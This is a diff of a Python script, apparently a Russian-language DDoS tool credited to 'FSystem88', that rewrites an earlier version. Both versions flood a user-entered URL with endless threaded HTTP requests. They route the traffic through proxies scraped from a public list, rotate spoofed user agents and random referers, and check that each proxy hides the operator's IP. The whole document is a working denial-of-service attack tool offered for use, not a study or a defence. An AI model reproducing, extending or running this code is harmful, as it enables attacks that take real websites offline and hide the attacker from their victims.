@@ -1,29 +1,30 @@
 #!/usr/bin/python3
-
-import requests, os, sys, random, re, threading
+import requests as r, os, threading, sys, random, re, time
+from threading import Thread
+from colorama import Fore,Style
 from bs4 import BeautifulSoup
-from colorama import Fore
 
-site = '' 
-proxy = ''
-headers_useragents, additionalHeaders = list (), list ()
+def clear(): 
+	if os.name == 'nt': 
+		os.system('cls') 
+	else: 
+		os.system('clear')
 
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
-	
+def useragent():
+	global randuser
+	randuser =['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36 OPR/67.0.3575.137',
+	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115',
+	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko/20100101 Firefox/75.0',
+	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv: 74.0) Gecko/20100101 Firefox/74.0',
+	'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv: 75.0) Gecko/20100101 Firefox/75.0',
+	'Mozilla/5.0 (Windows NT 10.0; rv: 68.0) Gecko/20100101 Firefox/68.0',
+	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
+	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/81.0.4044.92 Safari/537.36',
+	'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
+	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, как Gecko) Версия/13.1 Safari/605.1.15',
+	'Mozilla/5.0 (Linux; Android 10; MAR-LX1H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
+	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2986.42 Safari/537.36']
+
 def randomString(size):
 	out_str = ''
 	for i in range(0, size):
@@ -31,83 +32,54 @@ def randomString(size):
 		out_str += chr(a)
 	return(out_str)
 
-def initHeaders():
-	useragent_list()
-	global headers_useragents, additionalHeaders
-	headers = {
-				'User-Agent': random.choice(headers_useragents),
+def ddos(ip, prox, url, timer):
+	useragent()
+	try:
+		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=5).text
+	except:
+		ipx = ip
+	if ip != ipx:
+		proxies={}
+		proxies['http'] = prox
+		proxies['https'] = prox
+		colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
+		color = random.choice(colors)
+		headers = {
+				'User-Agent': random.choice(randuser),
 				'Cache-Control': 'no-cache',
 				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
 				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
 				'Keep-Alive': str(random.randint(110,120)),
 				'Connection': 'keep-alive'
 				}
-	if additionalHeaders:
-		for header in additionalHeaders:
-			headers.update({header.split(":")[0]:header.split(":")[1]})
-	return headers
+		while True:
+			try:
+				req = r.get(url, headers=headers)
+				req = r.get(url, headers=headers, proxies=proxies)
+				print(color+"{}  |  {}  |  localhost".format(req.status_code, url)+Style.RESET_ALL)
+				print(color+"{}  |  {}  |  {}".format(req.status_code, url, prox)+Style.RESET_ALL)
+				time.sleep(timer)
+			except:
+				continue
 
-def clear (): 
-	if os.name == 'nt': 
-		_ = os.system('cls') 
-	else: 
-		_ = os.system('clear')
+clear()
+print(Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\nDev: FSystem88 ~ [ prod. by Ca$h&Мир® ]"+Style.RESET_ALL)
 
-def get_proxy (url):
-	a=requests.get(url)
-
-	file=open("proxies.txt", 'w+')
-	file.write(a.text)	
-	file.close()
-
-
-def send (site, proxy):
-	proxies = open (proxy, 'r').read().splitlines()
-	prox = {}
-	for p in proxies:
-		headers = initHeaders()
-		prox['https'] = p
-		try:
-			while True:
-				#print (site, headers, prox)
-				requests.get (site, headers = headers, proxies = prox)
-				print (Fore.GREEN + 'Запрос на ' + site + ' Выполнен')
-		except:
-			continue
-
-def main ():
-	print ('''
-Наш телеграмчик: @Termuxtop
-·▄▄▄▄  ▄• ▄▌·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
-██▪ ██ █▪██▌██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
-▐█· ▐█▌█▌▐█▌▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
-██. ██ ▐█▄█▌██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
-▀▀▀▀▀•  ▀▀▀ ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
-	''')
-
-	site = input ('Введите url сайта: ')
-	thread = input ('Введите кол-во потоков (по умолчанию 500): ')
-	proxy = input ('Введите файл с proxy (или будут использоваться стандартные): ')
-
-	if thread.strip () == '':
-		thread = 500
-
-	if proxy.strip () == '':
-		get_proxy ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=2000&country=all&anonymity=elite&ssl=yes')
-		proxy = 'proxies.txt'
-
+url = input("URL: ")
+timer = input("Time delay in seconds (default 3): ")
+try:
+	if timer == "":
+		timer = 3
+	else:
+		timer = int(timer)
+except ValueError:
+	print(Fore.RED+"INCORRECT TIME DELAY"+Style.RESET_ALL)
+proxurl = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http"
+req = r.get(proxurl)
+ip = r.post("http://v4.ident.me/").text
+array = req.text.split()
+for prox in array:
 	thread_list = []
-
-	try:
-		for i in range (int(thread)):
-			t = threading.Thread (target = send, name = 'thread{}'.format (i), args = (site, proxy))
-			thread_list.append (t)
-			t.start()
-	except:
-		for t in thread_list:
-			t.join ()
-			print (Fore.RED + 'Все proxy заблокированы. DDoS остановлен...')
-
-if __name__ == '__main__':
-	clear ()
-	main ()
+	t = threading.Thread (target=ddos, args=(ip, prox, url, timer))
+	thread_list.append(t)
+	t.start()
